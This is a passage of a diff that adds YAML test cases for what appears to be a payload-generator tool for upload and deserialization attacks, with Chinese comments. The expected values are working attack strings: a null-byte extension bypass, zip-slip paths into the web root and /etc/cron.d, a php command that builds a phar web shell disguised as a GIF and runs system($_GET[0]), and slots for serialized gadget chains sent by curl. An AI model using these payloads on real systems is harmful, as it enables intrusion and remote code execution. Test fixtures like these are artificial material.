+    expect:
+      payload: "shell.php%00.jpg"
+
+  - name: ZIP 条目名穿越
+    state:
+      vuln: upload
+      template: upload.generic.zip.slip
+      vars: {name: "shell"}
+      outputs: [raw]
+    expect:
+      payload: "/../../../../var/www/html/shell.php"
+
+  - name: ZIP 条目名穿越 · 落到计划任务
+    state:
+      vuln: upload
+      template: upload.generic.zip.slip
+      slots: {webroot: cron, ext: ".sh"}
+      vars: {name: "backup"}
+      outputs: [raw]
+    expect:
+      payload: "/../../../../etc/cron.d/backup.sh"
+
+  - name: phar 伪装的图片马（生成脚本）
+    state:
+      vuln: upload
+      template: upload.generic.phar.disguise
+      nest: "<?php system($_GET[0]);?>"
+      outputs: [raw]
+    expect:
+      # 载荷是一整条 shell 命令，<<payload>> 被换成了要放进 phar 里的代码
+      payload: "php -d phar.readonly=0 -r '$p=new Phar(\"shell.jpg\");$p->startBuffering();$p->addFromString(\"a.txt\",\"<?php system($_GET[0]);?>\");$p->setStub(\"GIF89a<?php __HALT_COMPILER(); ?>\");$p->stopBuffering();'"
+
+  # ================= 外部生成器的粘贴位 =================
+  #
+  # ysoserial / phpggc 的产出（或手写的序列化串）贴进来之后，
+  # 工具在这里**唯一能多做的事就是校验**：长度前缀、元素个数、引用编号。
+  # 校验通过不代表链在目标上能用，只代表这串本身是合法的 PHP 序列化。
+
+  - name: 外部生成器 · 粘贴的序列化串合法
+    state:
+      vuln: deser
+      template: deser.php.external.serialized
+      vars: {blob: 'O:1:"A":1:{s:1:"p";r:1;}'}
+      outputs: [raw]
+    expect:
+      # 原样透传，同时过了校验（自引用 r:1 指得回根对象）
+      payload: 'O:1:"A":1:{s:1:"p";r:1;}'
+      syntax: ok
+
+  - name: 外部生成器 · 粘贴的串引用了不存在的号
+    state:
+      vuln: deser
+      template: deser.php.external.serialized
+      vars: {blob: 'O:1:"A":1:{s:1:"p";r:9;}'}
+      outputs: [raw]
+    expect:
+      # 这是**粘贴位最值钱的地方**：phpggc 改了版本、手改链的时候
+      # 引用号很容易指飞，而 PHP 那边只会说 Error at offset N。
+      # 期望值取自真实 PHP：这串在 unserialize 下同样失败。
+      payload: 'O:1:"A":1:{s:1:"p";r:9;}'
+      syntax: fail
+
+  - name: 外部生成器 · PHP base64 粘贴位
+    state:
+      vuln: deser
+      template: deser.php.external.b64
+      vars: {b64: 'TzoxOiJBIjoxOntzOjE6InAiO3I6MTt9'}
+      outputs: [raw]
+    expect:
+      # base64 看不出结构，所以是「没校验」而不是「通过」
+      payload: 'TzoxOiJBIjoxOntzOjE6InAiO3I6MTt9'
+      syntax: unchecked
+
+  - name: 外部生成器 · Java base64 粘贴位
+    state:
+      vuln: deser
+      template: deser.java.external.b64
+      vars: {b64: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAAAAAAAAAABAwAAeHD//w=='}
+      outputs: [raw, curl]
+    expect:
+      # Java 原生序列化的 magic 是 0xACED0005，base64 打头固定是 rO0AB
+      payload: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAAAAAAAAAABAwAAeHD//w=='
+      outputs: {curl: "curl 'http://example.com/?id=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAAAAAAAAAABAwAAeHD%2F%2Fw%3D%3D'"}
